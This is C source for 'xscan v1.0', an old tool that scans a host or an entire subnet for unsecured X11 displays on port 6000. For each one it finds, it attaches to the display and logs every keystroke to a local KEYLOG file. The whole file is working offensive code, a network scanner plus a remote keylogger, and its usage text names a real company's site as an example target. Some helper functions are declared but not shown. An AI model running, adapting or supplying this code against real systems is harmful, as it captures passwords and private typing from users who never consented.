/**********************************************************************

        xscan v1.0 - Scans hosts for unsecured X displays and logs
                        keystrokes of those displays.

contact: pendleto@math.ukans.edu


***********************************************************************/



#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <X11/Xlib.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>

struct quad {
	char first[5];
	char second[5];
	char third[5];
	char forth[5];
	int num;
	};

char *TranslateKey(XEvent *Event);
void get_window_keystrokes(Display * RemoteDisplay,Window DefRootWnd);

int scan_host(char *servername) 
{
struct hostent *host;
struct sockaddr_in remote;
int sock;

if (isdigit(servername[0]))
{
remote.sin_addr.s_addr=inet_addr(servername);
}
else
{
	host=gethostbyname(servername);
	if (host==0) {
        fprintf(stderr,"%s: unknown host\n",servername);
        return -1;
	}
	else {
	bcopy((char *)host->h_addr, (char *)&remote.sin_addr,host->h_length);
	}
}
printf("Scanning hostname %s ...\n",servername); fflush(stdout); 
remote.sin_port=htons(6000);
remote.sin_family=AF_INET;
printf("Connecting to %s (%s) on port %d...\n",servername,inet_ntoa(remote.sin_addr),6000);
fflush(stdout);
sock=socket(AF_INET,SOCK_STREAM,0);
if (sock<0) {
        perror("opening stream socket");
        return -1;
}

if (connect(sock,(struct sockaddr *)&remote, sizeof remote)<0) {
	return 0;
}
else
{
printf("Connected.\n");
close(sock);
return 1;
}

}

int check_for_x(char *servername)
{
int ret;
ret=scan_host(servername);
if (ret==1)
        {
        printf("Host %s is running X.\n",servername);
	fflush(stdout);
	open_window(servername);
	return 1;
        }
else if (ret==0)  {printf("Host %s is not running X.\n",servername);fflush(stdout);}
return 0;
}

void GetKeystrokes(char *sn)
{
Display  *disp;
FILE *outf;
XEvent xev;
char *string;
char fname[30];

 disp = XOpenDisplay(sn);
  if (disp == NULL)
   {
     fprintf(stderr, "Cannot open display: %s\n", sn);
     return;
   }

get_window_keystrokes(disp,DefaultRootWindow(disp));

sprintf(fname,"KEYLOG%s",sn);
if ((outf=fopen(fname,"w"))==NULL) {fprintf(stderr, "Cannot open output file");return;}
printf("Starting keyboard logging of host %s to file %s...\n",sn,fname);
while(1)
   {
     XNextEvent(disp, &xev);
     string = TranslateKey(&xev);
     if (string == NULL)
       continue;
 
     if (*string == '\r')
       fprintf(outf,"%s","\n");
     else if (strlen(string) == 1)
       fprintf(outf,"%s", string);
     else
       fprintf(outf,"[%s]", string);
     fflush(outf);
   }

fclose(outf);
}

int open_window(char *servername)
{
char sn[80];
char comm[100];
int ret;

sprintf(sn,"%s:0.0",servername);
/*XOpenDisplay(sn)==0*/

ret=fork();

if (ret==0)
	{GetKeystrokes(sn);exit(1);}

}

struct quad * getaddresses(char *servername)
{
char sn[80];
char *aquad;
struct quad *squad;
squad=(struct quad *)malloc(sizeof(struct quad));
strcpy(sn,servername);
aquad=strtok(sn,".");
if (aquad==NULL){squad->num=0;}
else
{	strcpy(squad->first,aquad);
	aquad=strtok(NULL,".");
	if (aquad==NULL){squad->num=1;}
	else
	{	strcpy(squad->second,aquad);
		aquad=strtok(NULL,".");
		if (aquad==NULL){squad->num=2;}
		else
		{
			strcpy(squad->third,aquad);
			aquad=strtok(NULL,".");
			if (aquad==NULL){squad->num=3;}
			else {	strcpy(squad->forth,aquad);
				squad->num=4;
			}
		}
	}
}

return squad;
}


void scan_c(struct quad * sq)
{
char servername[80];
int i;
struct hostent *hp;
for (i=1;i<255;i++)
                {
                sprintf(servername,"%s.%s.%s.%d",sq->first,sq->second,sq->third,i);
                printf("Scanning %s\n",servername);
		check_for_x(servername);
                }

}

void scan_b(struct quad * sq)
{
int i;
for (i=1;i<255;i++)
                {
                sprintf(sq->third,"%d",i); 
                scan_c(sq);
                }
}

main(int argc,char **argv)
{
int i;
struct hostent *hp;
struct quad *sq;
char servername[80];

if (argc==1) {
fprintf(stderr,"Usage: %s <host> | <subnet> [[<host>] [<subnet>] ...]\n\ne.g.\n %s www.microsoft.com \n %s 129.23.4\n",argv[0],argv[0],argv[0]);
exit(1);
}

for (i=1;i<argc;i++)
{
strcpy(servername,argv[i]);
if (isdigit(servername[0]))
	{
	sq=getaddresses(servername);
	if (sq->num==2)
		scan_b(sq);
	if (sq->num==3)
		scan_c(sq);
	if (sq->num==4)
		check_for_x(servername);		
	}
else {
	check_for_x(servername);
	}
}

}
